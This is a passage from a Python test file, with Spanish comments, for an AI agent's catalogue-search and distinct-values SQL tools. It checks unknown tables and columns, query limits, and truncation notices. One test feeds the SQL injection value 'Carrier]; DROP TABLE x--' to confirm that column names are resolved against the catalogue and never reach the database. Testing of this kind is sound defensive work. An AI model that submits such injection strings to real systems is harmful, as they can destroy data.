        motor = _MotorDeCatalogo([])
        with contexto_peticion(motor):
            respuesta = buscar_modelos.invoke({"texto": "telefono inexistente"})

        assert "Ningun modelo" in respuesta

    def test_texto_sin_palabras_utiles(self):
        motor = _MotorDeCatalogo([])
        with contexto_peticion(motor):
            assert "al menos una palabra" in buscar_modelos.invoke({"texto": "!!! ???"})


class TestValoresDistintos:
    """Explorar valores sin generar un reporte.

    Existe porque el agente corria `SELECT DISTINCT [Retail]` por
    `consultar_sql` para comprobar como estaban escritos los valores, y esa
    comprobacion se convertia en un Excel que pisaba el reporte de verdad: el
    usuario recibia la lista de retailers en vez de sus ventas.
    """

    def _invocar(self, tabla, columna, filas=()):
        motor = _MotorDeCatalogo(list(filas))
        with contexto_peticion(motor):
            return motor, valores_distintos.invoke({"tabla": tabla, "columna": columna})

    def test_lista_los_valores(self):
        _, respuesta = self._invocar(
            "EKT_B2B", "Carrier", [("ABIERTA",), ("TELCEL",)]
        )
        assert "ABIERTA" in respuesta and "TELCEL" in respuesta

    def test_una_tabla_desconocida_no_llega_a_la_base(self):
        motor, respuesta = self._invocar("TablaInventada", "Retail")
        assert "No conozco" in respuesta
        assert motor.sql is None

    def test_una_columna_inexistente_lista_las_que_si_hay(self):
        motor, respuesta = self._invocar("EKT_B2B", "NoExiste")
        assert "no tiene columna" in respuesta
        assert "Carrier" in respuesta  # le dice cuales si existen
        assert motor.sql is None

    def test_el_nombre_de_columna_nunca_viaja_como_texto_libre(self):
        # Un identificador no se puede parametrizar, asi que se resuelve
        # contra el catalogo y al SQL va el nombre del CATALOGO, nunca lo que
        # escribio el modelo.
        motor, respuesta = self._invocar("EKT_B2B", "Carrier]; DROP TABLE x--")
        assert "no tiene columna" in respuesta
        assert motor.sql is None

    def test_el_sql_usa_el_nombre_calificado_y_un_tope(self):
        motor, _ = self._invocar("EKT_B2B", "carrier", [("TELCEL",)])
        assert "[RAW_DATA_B2B].dbo.[EKT_B2B]" in motor.sql
        assert f"TOP {modulo_agente.MAX_VALORES}" in motor.sql

    def test_avisa_cuando_la_lista_quedo_cortada(self):
        filas = [(f"v{i}",) for i in range(modulo_agente.MAX_VALORES)]
        _, respuesta = self._invocar("EKT_B2B", "Carrier", filas)
        assert "solo los primeros" in respuesta
